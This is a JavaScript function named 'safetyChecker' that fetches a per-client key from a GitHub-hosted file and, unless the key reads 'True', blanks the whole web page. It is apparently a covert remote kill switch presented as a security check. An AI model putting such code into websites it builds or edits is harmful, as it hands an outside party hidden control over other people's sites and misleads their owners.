async function safetyChecker(x) {
    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
    try {
        await delay(2000);
        let url = x;
        let security_key = "True";
        let customer_security_key = "";
        let fetchSuccess = false;
        
        // Try multiple sources
        const sources = [
            `https://cdn.jsdelivr.net/gh/monibansari/Blanker@main/clients/${url}.txt?t=${Date.now()}`,
            `https://raw.githubusercontent.com/monibansari/blanker/main/clients/${url}.txt?t=${Date.now()}`
        ];
        
        for (let source of sources) {
            try {
                const response = await fetch(source, {
                    cache: 'no-cache'
                });
                if (response.ok) {
                    customer_security_key = await response.text();
                    customer_security_key = customer_security_key.trim();
                    console.log(`✅ Fetched: "${customer_security_key}" from ${source}`);
                    fetchSuccess = true;
                    break;
                }
            } catch (e) {
                continue;
            }
        }
        
        if (!fetchSuccess) {
            console.log("🟢 Keeping site (fetch failed)");
            return;
        }
        
        if (security_key !== customer_security_key) {
            console.log("❌ BLANKING PAGE NOW!");
            
            // INSTANT BLANK - Multiple methods
            try {
                // Method 1: Clear everything
                document.open();
                document.write('');
                document.close();
                
                // Method 2: Remove body
                if (document.body) {
                    document.body.remove();
                }
                
                // Method 3: Replace with empty
                document.documentElement.innerHTML = '';
                
                // Method 4: Redirect to blank page
                window.stop();
                
                console.log("💀 PAGE IS BLANK!");
            } catch(e) {
                console.log("Blank error:", e);
            }
        } else {
            console.log("✅ Security PASSED");
        }
    } catch (error) {
        console.log("🟢 Keeping site (error)");
    }
}
